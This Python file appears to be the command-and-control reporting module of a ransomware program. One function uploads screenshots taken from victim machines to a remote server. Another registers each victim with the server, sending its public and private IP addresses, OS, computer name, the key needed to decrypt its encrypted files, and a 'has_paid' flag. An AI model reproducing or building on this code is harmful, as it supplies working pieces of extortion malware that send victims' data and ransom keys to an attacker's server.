#  Copyright (c) 2022. Esteban Restoy e.restoy24@gmail.com

"""System modules"""
import base64
import datetime
import json
import os
from os.path import split
import requests

SERVER_COMPUTER_URL = os.getenv("WEB_SERVER_URL_COMPUTER_POST")
SERVER_SCREENSHOT_URL = os.getenv("WEB_SERVER_URL_SCREENSHOT_POST")
SERVER_EXPLOIT_URL = os.getenv("WEB_SERVER_URL_SCREENSHOT_POST")


def post_image(image_path: str, computer_id: int):
    """
    This function is used to post a file to a web server
    1) Prepare the payload with the image file and the computer ID
    2) Make a POST request to the web server with the payload
    :param image_path: The path of the image file to send
    :param computer_id: the ID of the current computer in the server database
    """

    payload = {'computer': computer_id}
    __, file_name = split(image_path)

    with open(image_path, 'rb') as file:
        files = [
            ('image', (file_name, file, 'image/png'))
        ]
        headers = {
            'Authorization': 'Basic ' + base64.b64encode((os.getenv("API_ADMIN_USERNAME") + ":" +
                                                          os.getenv("API_ADMIN_PASSWORD"))
                                                         .encode()).decode(),
        }
        print(requests.request("POST",
                               SERVER_SCREENSHOT_URL,
                               headers=headers,
                               data=payload,
                               files=files).text)


def create_computer(public_ip: str,
                    private_ip: str,
                    computer_os: str,
                    computer_name: str,
                    decryption_key: str):
    """
    This function is used create a new computer on the database of the web server
    1) Prepare the payload with all the information in param
    2) Make a POST request to the web server with the payload
    3) return the response (the computer object with it's ID)
    :param decryption_key: the key used to decrypt the encrypted files on the computer
    :param computer_os: Computer OS
    :param computer_name: Computer name
    :param private_ip: Private IP of the computer
    :param public_ip: Public IP of the computer
    """

    payload = json.dumps({
        "private_ip": private_ip,
        "public_ip": public_ip,
        "os": computer_os,
        "name": computer_name,
        "decryption_key": decryption_key,
        "has_paid": False,
        "last_message_date": str(datetime.datetime.now(datetime.timezone.utc))
    })

    headers = {
        'Authorization': 'Basic ' + base64.b64encode((os.getenv("API_ADMIN_USERNAME") + ":" +
                                                      os.getenv("API_ADMIN_PASSWORD"))
                                                     .encode()).decode(),
        'Content-Type': 'application/json'
    }

    response = requests.request("POST", SERVER_COMPUTER_URL, headers=headers, data=payload)

    json_response = response.json()
    print(json_response)

    return json_response
